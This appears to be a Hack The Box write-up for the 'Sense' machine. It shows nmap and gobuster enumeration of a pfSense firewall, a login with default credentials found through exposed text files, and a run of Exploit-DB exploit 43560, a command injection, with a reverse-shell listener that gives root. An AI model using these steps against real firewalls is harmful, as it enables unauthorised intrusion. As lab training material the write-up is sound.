# recon
- nmap
```
80/tcp  open  http       lighttpd 1.4.35
|_http-server-header: lighttpd/1.4.35
|_http-title: Did not follow redirect to https://sense.htb/
|_https-redirect: ERROR: Script execution failed (use -d to debug)
443/tcp open  ssl/https?
|_ssl-date: TLS randomness does not represent time
```
- linux like os -> ping ttl
- http://sense.htb give me an error -> 
```
Potential DNS Rebind attack detected, see http://en.wikipedia.org/wiki/DNS_rebinding
Try accessing the router by IP address instead of by hostname.
```
- 200 with login page went access web page by entering IP addr
- /index.php :PF Sense login page
  - defualt admin didnt works [link](https://pfsense-docs.readthedocs.io/en/latest/usermanager/pfsense-default-username-and-password.html)
- /index.html : dragonfly bsd

## gobuster
I use to wordlist this time, the first one I use for big.txt but I didnt get any good hit, I then try with the lowercase meddium and yea I got good hint on 2 .txt files
```console
$ gobuster dir -u https://10.10.10.60/ -x txt,php,html -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt -t 54 -k

/classes (Status: 301)
/css (Status: 301)
/edit.php (Status: 200)
/exec.php (Status: 200)
/favicon.ico (Status: 200)
/graph.php (Status: 200)
/help.php (Status: 200)
/includes (Status: 301)
/index.php (Status: 200)
/index.html (Status: 200)
/installer (Status: 301)
/interfaces.php (Status: 200)
/javascript (Status: 301)
/license.php (Status: 200)
/pkg.php (Status: 200)
/stats.php (Status: 200)
/status.php (Status: 200)
/system.php (Status: 200)
/themes (Status: 301)
/tree (Status: 301)
/widgets (Status: 301)
/wizards (Status: 301)
/wizard.php (Status: 200)
/xmlrpc.php (Status: 200)
/~sys~ (Status: 403)
/changelog.txt
/system-users.txt
```
- /changelog.txt
```
# Security Changelog 

### Issue
There was a failure in updating the firewall. Manual patching is therefore required

### Mitigated
2 of 3 vulnerabilities have been patched.

### Timeline
The remaining patches will be installed during the next maintenance window
```
okey so 1 vulnerability still exist.

- /system-users.txt
```
####Support ticket###

Please create the following user


username: Rohit
password: company defaults
```
so we get the cresential... but password? company defaults??? I guess it is the defualt password for pf sense which we found in the link above. now try to login with **rohit:pfsense**


Boom we are in!
-systeminfo
```
2.1.3-RELEASE (amd64)
built on Thu May 01 15:52:13 EDT 2014
FreeBSD 8.3-RELEASE-p16
```
As we are already know from `/changelog.txt`. there is a serious vuln on the firewall which is not patch yet, so let google and find out.


after some googling, I found exploit this version. [link](https://www.exploit-db.com/exploits/43560). so let use searchsploit to get the exploit script and lunch our attack
```
kali@kali:~/HTB/sense$ searchsploit pfSense 2.1.4
--------------------------------------------------------------- ---------------------------------
 Exploit Title                                                 |  Path
--------------------------------------------------------------- ---------------------------------
pfSense < 2.1.4 - 'status_rrd_graph_img.php' Command Injection | php/webapps/43560.py
--------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
kali@kali:~/HTB/sense$ searchsploit -m php/webapps/43560.py
  Exploit: pfSense < 2.1.4 - 'status_rrd_graph_img.php' Command Injection
      URL: https://www.exploit-db.com/exploits/43560
     Path: /usr/share/exploitdb/exploits/php/webapps/43560.py
File Type: Python script, ASCII text executable, with CRLF line terminators

Copied to: /home/kali/HTB/sense/43560.py
```
let check the exploit script
```
kali@kali:~/HTB/sense$ python3 43560.py -h
usage: 43560.py [-h] [--rhost RHOST] [--lhost LHOST] [--lport LPORT] [--username USERNAME]
                [--password PASSWORD]

optional arguments:
  -h, --help           show this help message and exit
  --rhost RHOST        Remote Host
  --lhost LHOST        Local Host listener
  --lport LPORT        Local Port listener
  --username USERNAME  pfsense Username
  --password PASSWORD  pfsense Password
```
okey let run it
```
kali@kali:~/HTB/sense$ python3 43560.py --rhost 10.10.10.60 --lhost tun0 --lport 6969 --username rohit --password pfsense
CSRF token obtained
Running exploit...
Exploit completed
```
boom we got shell....... AS ROOT!!!


go grab flags, GLHF